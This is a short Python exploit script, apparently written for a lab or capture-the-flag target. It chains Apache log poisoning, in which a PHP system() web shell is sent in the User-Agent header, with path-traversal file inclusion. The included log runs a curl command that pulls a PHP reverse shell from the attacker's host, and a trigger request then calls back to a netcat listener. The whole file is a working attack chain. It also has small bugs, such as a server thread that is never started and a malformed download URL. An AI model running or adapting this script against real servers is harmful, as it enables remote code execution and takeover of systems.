from logging import Handler
import requests
import http.server
import socketserver
import argparse
import urllib
import os
from threading import Thread

#Temporary hard-coded variables
LHOSTS = "192.168.0.1"
RHOSTS = "10.0.0.1"
PORT = 8000
RPORT = 4444 #default
RSHELL = "./php-reverse-shell.php" # default

POISON =  " \"<?php system($_GET['c']); ?>\" "
PAYLOAD = RHOSTS + "/?view=dog/../../../../../../var/log/apache2/access.log&ext=&c="\
 + urllib.parse.quote(f"curl {LHOSTS}/php-reverse-shell.php:8000 --output shell.php")

TRIGGER = f"{RHOSTS}/?view=dog/../shell&IP={LHOSTS}"

def serve_reverse_shell():
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("serving at port", PORT)
        httpd.serve_forever()

def main():
    print("[*] Poisoning Apache log file with command injection...")
    response = requests.get("http://" + RHOSTS,headers={"user-agent" : POISON})
    if response.status_code != 200:
        print("[!] Error, server rejected request. Maybe wrong ip address?")
        exit()
    else:
        print("[+] Done.")
        # ADD Status saving here!
    print("[*] Starting http server to serve reverse shell...")
    t = Thread(target=serve_reverse_shell,daemon=True)
    print("[+] Done")
    print("[*] Staging php reverse shell...")
    response = requests.get("http://" + PAYLOAD)
    if response.status_code == 500 or response.text.find("Warning") != -1 or response.text.find("Fatal erro") != -1:
        print("[!] Error, php include failed including acess.log. Maybe Payload string is broken?")
    print("[+] Request accepted")
    print("[?] Start your netcat listener to get a reverse shell conection with nc -lvnp 4444")
    input("Press Enter when netcat listener is up...")
    print("[!!] Trigering reverse shell... Did you get a shell?")
    requests.get("http://" + TRIGGER)
    

if __name__ == '__main__':
    main()